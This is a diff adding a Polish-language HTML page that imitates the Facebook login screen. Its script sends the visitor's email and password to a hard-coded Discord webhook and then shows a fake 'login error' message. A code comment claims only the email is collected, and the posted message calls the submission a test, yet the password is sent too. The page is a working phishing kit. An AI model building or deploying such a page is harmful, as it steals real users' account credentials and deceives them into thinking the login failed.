@@ -1,0 +1,159 @@
+<html lang="pl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Logowanie — FACEBOOK</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      gap: 60px;
+      width: 90%;
+      max-width: 1000px;
+    }
+    .left {
+      flex: 1;
+    }
+    .left h1 {
+      font-size: 48px;
+      font-weight: 700;
+      color: #1877f2;
+      margin: 0 0 20px;
+    }
+    .left p {
+      font-size: 20px;
+      color: #1c1e21;
+    }
+    .card {
+      flex: 1;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    input {
+      padding: 14px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+    }
+    .btn-primary {
+      background: #1877f2;
+      border: none;
+      color: #fff;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn-primary:hover {
+      background: #166fe5;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #606770;
+      margin: 12px 0;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dadde1;
+    }
+    .divider::before { margin-right: 8px; }
+    .divider::after { margin-left: 8px; }
+    .btn-secondary {
+      background: #42b72a;
+      border: none;
+      color: #fff;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 60%;
+      margin: 0 auto;
+      display: block;
+    }
+    .btn-secondary:hover {
+      background: #36a420;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      text-align: center;
+      color: #606770;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <h1>FACEBOOK</h1>
+      <p>Zaloguj się, aby połączyć się ze znajomymi i światem wokół Ciebie.</p>
+    </div>
+    <div class="card">
+      <form id="loginForm" novalidate>
+        <input type="text" id="email" placeholder="Adres e‑mail lub numer telefonu" required />
+        <input type="password" id="password" placeholder="Hasło" required />
+        <button class="btn-primary" type="submit">Zaloguj się</button>
+        <div class="divider">albo</div>
+        <button class="btn-secondary" type="button">Utwórz nowe konto</button>
+      </form>
+      <div class="footer">
+        Masz problem z logowaniem? <a href="#">Odzyskaj dostęp</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      // Pobieramy dane z formularza (tylko e-mail)
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Twój Discord webhook URL
+      const webhookUrl = "https://discord.com/api/webhooks/1455725220127051898/Ll8iDQb-4dmSHVKPIIkqkBXeQzrliYYAhx_wopGnaZlh9-x3CXXeTFsNLDPMEeXy8s6L";
+
+      // Wysyłamy powiadomienie na Discorda
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `🔔 Formularz wypełniony testowo. E-mail: ${email} oraz hasło ${password}`
+        })
+      });
+
+      alert('błąd logowania');
+    });
+  </script>
+</body>
+</html>
